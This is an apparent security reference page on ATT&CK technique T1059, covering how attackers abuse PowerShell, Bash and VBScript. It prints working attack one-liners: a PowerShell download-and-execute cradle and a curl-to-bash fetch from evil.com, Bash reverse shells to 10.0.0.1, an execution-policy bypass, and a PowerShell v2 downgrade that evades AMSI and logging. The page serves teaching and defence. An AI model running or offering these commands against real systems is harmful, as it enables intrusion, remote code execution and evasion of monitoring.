---
title: Command and Scripting Interpreter
tags: [execution, powershell, bash, python, lolbas]
description: Abusing built-in command shells (PowerShell, Bash) to execute malicious code. Downgrade attacks and logging bypasses.
date: 2024-01-02
---

# Command and Scripting Interpreter (T1059)

Adversaries abuse these to execute commands without dropping binaries.

## 1. PowerShell (Windows)
The most powerful tool on Windows.

### Execution Policy Bypass
The "Execution Policy" is a user safety feature, NOT a security boundary.
```powershell
powershell -ExecutionPolicy Bypass -File script.ps1
powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')"
```

### In-Memory Execution (Fileless)
Running code directly from RAM.
```powershell
$code = 'Create-Thread...'; 
Invoke-Expression $code;
```

### Evasion: Downgrade Attack
PowerShell v2.0 does not support AMSI (Anti-Malware Scan Interface) or Script Block Logging.
```bash
powershell -version 2
```
*Mitigation*: Uninstall PowerShell v2.0 on all endpoints.

## 2. Bash / Sh (Linux)
The standard for Linux post-exploitation.

### Reverse Shells
```bash
# Bash TCP
bash -i >& /dev/tcp/10.0.0.1/443 0>&1

# Fifo Pipe (creates a file)
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 443 >/tmp/f
```

### Fileless Execution
Executing a script from URL without saving to disk.
```bash
curl https://evil.com/script.sh | bash
```

## 3. Visual Basic (VBScript / JScript)
Often used in dropped files (User Execution).
- **HTA (HTML Application)**: Executes via `mshta.exe`.
- **WScript**: Executing `.vbs` files.
